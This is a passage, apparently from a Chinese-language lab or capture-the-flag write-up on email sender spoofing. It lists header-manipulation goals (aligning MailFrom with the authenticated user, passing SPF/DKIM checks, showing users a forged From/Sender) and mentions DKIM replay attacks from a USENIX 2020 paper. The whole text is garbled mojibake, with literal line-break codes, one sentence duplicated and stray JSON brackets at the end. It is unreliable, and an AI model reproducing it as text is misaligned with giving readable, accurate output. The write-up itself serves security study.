MTAä¸‰ç§ç±»å‹çš„æ”»å‡»è§’åº¦ï¼›\r\n\r\nå¦ä¸€æ–¹é¢ä¹Ÿå¯ä»¥æŒ‰ç…§2020å¹´USENIXä¸­çš„åˆ†ç±»æ–¹æ³•ï¼š\r\n\r\n- Intra-Server\r\n- UI-mismatch\r\n- ambiguous-replay\r\n\r\nè¿™ä¸¤ç¯‡è®ºæ–‡éƒ½å†™çš„å¾ˆè¯¦ç»†ï¼Œå…·ä½“å†…å®¹åœ¨æ­¤ä¸èµ˜è¿°\r\n\r\nåœ¨æˆ‘ä»¬é¶åœºåšé¢˜ä¸­ï¼Œä¸»è¦ä½¿ç”¨åˆ°çš„æ€è·¯æ˜¯å¯¹Fromã€Senderã€MailFromç­‰å†…å®¹è¿›è¡Œå˜å½¢ï¼Œæˆªæ–­ï¼›\r\n\r\næœ€ç»ˆçš„ç›®çš„æ˜¯ï¼š\r\n\r\n- MailFromå­—æ®µå’ŒAuth Userä¿æŒä¸€è‡´ï¼›\r\n- Fromå­—æ®µåœ¨SPF/DKIMæ ¡éªŒæ—¶ä¸MailFromä¸€è‡´;\r\n- From/Senderå­—æ®µæ˜¾ç¤ºç»™ç”¨æˆ·æ—¶æ˜¾ç¤ºæˆ‘ä»¬å¸Œæœ›ä¼ªé€ çš„å†…å®¹ï¼›å¦å¤–Level5ã€Level6æ¶‰åŠåˆ°USENIX2020ä¸­ç¬¬å…­ç« é’ˆå¯¹DKIMçš„Replay Attackï¼Œè¿™ä¸€ç« å†™çš„æ€è·¯å¾ˆæ¸…æ¥šï¼Œå¹¶ä¸”æ”»å‡»æ–¹æ³•å¾ˆè¯¦ç»†ã€‚\r\n\r\nå¦å¤–Level5ã€Level6æ¶‰åŠåˆ°USENIX2020ä¸­ç¬¬å…­ç« é’ˆå¯¹DKIMçš„Replay Attackï¼Œè¿™ä¸€ç« å†™çš„æ€è·¯å¾ˆæ¸…æ¥šï¼Œå¹¶ä¸”æ”»å‡»æ–¹æ³•å¾ˆè¯¦ç»†ã€‚\r\n\r\n# å‚è€ƒèµ„æ–™\r\n- [http://datacon.qianxin.com/blog/archives/277](http://datacon.qianxin.com/blog/archives/277)"}]}}}